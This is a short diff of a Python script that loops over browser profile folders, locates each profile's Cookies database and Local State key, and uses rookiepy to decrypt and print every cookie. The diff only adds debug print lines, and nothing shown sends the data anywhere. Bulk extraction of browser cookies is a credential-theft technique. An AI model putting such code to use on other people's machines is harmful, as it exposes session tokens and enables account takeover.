@@ -48,8 +48,11 @@ print("mainnnn")
 def main():
     detected_folders = detect_folders(BASE_DIR)
     for profile in detected_folders:
+        print(profile)
         db_path = Path(BASE_DIR) / profile / "Network" / "Cookies"
+        print(db_path)
         key_path = Path(BASE_DIR) / "Local State"
+        print(key_path)
         print("coo")
         cookies = rookiepy.any_browser(db_path=str(db_path), key_path=str(key_path), domains=None)
         print(cookies)
